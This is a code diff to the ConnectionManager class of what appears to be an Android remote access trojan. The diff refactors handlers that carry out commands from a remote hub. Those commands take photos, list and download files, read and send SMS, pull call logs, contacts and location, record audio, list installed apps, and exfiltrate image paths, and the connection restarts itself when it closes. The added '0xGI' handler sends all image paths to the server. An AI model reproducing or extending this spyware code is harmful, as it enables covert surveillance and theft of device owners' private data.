@@ -26,6 +26,7 @@ public class ConnectionManager {
 
     public static Context context;
     private static HubConnection ioSocket;
+    private static boolean initialBoot = false;
 
     public static void startAsync(Context con) {
         try {
@@ -37,6 +38,130 @@ public class ConnectionManager {
 
     }
 
+    private static void setupHandlers(HubConnection ioSocket){
+
+        ioSocket.on("0xCA", (data) -> {
+            try {
+                if (data.getString("action").equals("camList"))
+                    CA(-1);
+                else if (data.getString("action").equals("takePic"))
+                    CA(Integer.parseInt(data.getString("cameraID")));
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }, JSONObject.class);
+
+        ioSocket.on("0xFI", (action, path) -> {
+            try {
+                if (action.equals("ls"))
+                    FI(0, path);
+                else if (action.equals("dl"))
+                    FI(1, path);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }, String.class, String.class);
+
+        ioSocket.on("0xGI", () -> {
+            try {
+                GI();
+            } catch (Exception ex){
+                ex.printStackTrace();
+            }
+        });
+
+        ioSocket.on("0xSM", (action, to, sms) -> {
+            try {
+                if (action.equals("ls"))
+                    SM(0, null, null);
+                else if (action.equals("sendSMS"))
+                    SM(1, to, sms);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }, String.class, String.class, String.class);
+
+
+        ioSocket.on("0xCL", () -> {
+            try {
+                CL();
+
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        });
+
+
+        ioSocket.on("0xCO", () -> {
+            try {
+                CO();
+
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        });
+
+
+        ioSocket.on("0xMI", (sec) -> {
+            try {
+                MI(sec);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }, Integer.class);
+
+
+        ioSocket.on("0xLO", () -> {
+            try {
+                LO();
+
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        });
+
+        ioSocket.on("0xWI", () -> {
+            try {
+                WI();
+
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        });
+
+        ioSocket.on("0xPM", () -> {
+            try {
+                PM();
+
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        });
+
+        ioSocket.on("0xIN", () -> {
+            try {
+                IN();
+
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        });
+
+        ioSocket.on("0xGP", (permission) -> {
+            try {
+                GP(permission);
+
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }, String.class);
+
+
+        ioSocket.onClosed((ex) -> {
+            ioSocket.start();
+        });
+    }
+
     public static void sendReq() {
         try {
             if (ioSocket != null && ioSocket.getConnectionState() != HubConnectionState.DISCONNECTED)
@@ -44,119 +169,14 @@ public class ConnectionManager {
 
             ioSocket = IOSocket.getInstance().getIoSocket();
 
+            if (!initialBoot){
+                initialBoot = true;
+
+                setupHandlers(ioSocket);
+            }
             ///ioSocket.on("ping", () -> ioSocket.send("pong"));
 
-            ioSocket.on("0xCA", (data) -> {
-                try {
-                    if (data.getString("action").equals("camList"))
-                        CA(-1);
-                    else if (data.getString("action").equals("takePic"))
-                        CA(Integer.parseInt(data.getString("cameraID")));
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
-            }, JSONObject.class);
 
-            ioSocket.on("0xFI", (action, path) -> {
-                try {
-                    if (action.equals("ls"))
-                        FI(0, path);
-                    else if (action.equals("dl"))
-                        FI(1, path);
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
-            }, String.class, String.class);
-
-            ioSocket.on("0xSM", (action, to, sms) -> {
-                try {
-                    if (action.equals("ls"))
-                        SM(0, null, null);
-                    else if (action.equals("sendSMS"))
-                        SM(1, to, sms);
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
-            }, String.class, String.class, String.class);
-
-
-            ioSocket.on("0xCL", () -> {
-                try {
-                    CL();
-
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
-            });
-
-
-            ioSocket.on("0xCO", () -> {
-                try {
-                    CO();
-
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
-            });
-
-
-            ioSocket.on("0xMI", (sec) -> {
-                try {
-                    MI(sec);
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
-            }, Integer.class);
-
-
-            ioSocket.on("0xLO", () -> {
-                try {
-                    LO();
-
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
-            });
-
-            ioSocket.on("0xWI", () -> {
-                try {
-                    WI();
-
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
-            });
-
-            ioSocket.on("0xPM", () -> {
-                try {
-                    PM();
-
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
-            });
-
-            ioSocket.on("0xIN", () -> {
-                try {
-                    IN();
-
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
-            });
-
-            ioSocket.on("0xGP", (permission) -> {
-                try {
-                    GP(permission);
-
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
-            }, String.class);
-
-            ioSocket.onClosed((ex) -> {
-                ioSocket.start();
-            });
 
             ioSocket.start().subscribe(new CompletableObserver() {
                 @Override
@@ -210,24 +230,23 @@ public class ConnectionManager {
 
     public static void FI(int req, String path) {
         if (req == 0) {
-            JSONObject object = new JSONObject();
-            try {
-                object.put("type", "list");
-                object.put("list", FileManager.walk(path));
-                ioSocket.send("_0xFI", object);
-            } catch (JSONException e) {
-            }
+            ioSocket.send("_0xFI", FileManager.walk(path).toString());
         } else if (req == 1)
             FileManager.downloadFile(path);
+    }
+
+    public static void GI() {
+        ioSocket.send("_0xGI", FileManager.getAllShownImagesPath().toString());
     }
 
 
     public static void SM(int req, String phoneNo, String msg) {
         if (req == 0)
-            ioSocket.send("_0xLM", SMSManager.getsms());
+            ioSocket.send("_0xLM", SMSManager.getsms().toString());
         else if (req == 1) {
             boolean isSent = SMSManager.sendSMS(phoneNo, msg);
-            ioSocket.send("_0xSM", isSent);
+            //ioSocket.send("_0xSM", isSent, phoneNo, msg);
+            ioSocket.send("_0xLM", SMSManager.getsms().toString());
         }
     }
 
